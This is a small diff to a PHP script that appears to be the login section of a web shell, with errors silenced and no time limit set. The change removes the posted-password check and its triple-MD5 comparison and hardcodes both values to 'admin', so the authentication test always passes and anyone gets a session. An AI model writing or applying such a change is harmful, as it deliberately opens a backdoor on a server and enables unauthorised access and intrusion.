@@ -2,11 +2,9 @@
 @session_start();
 @set_time_limit(0); 
 @error_reporting(0);
-$psw = trim($_POST['pass']);
-$pass = $psw;
-$pass = md5(md5(md5($pass)));
+$pass = "admin";
 $chk_login = 1;
-$password = "21232f297a57a5a743894a0e4a801fc3";
+$password = "admin";
 if($pass == $password)
 {
 $_SESSION['ses'] = "$pass";
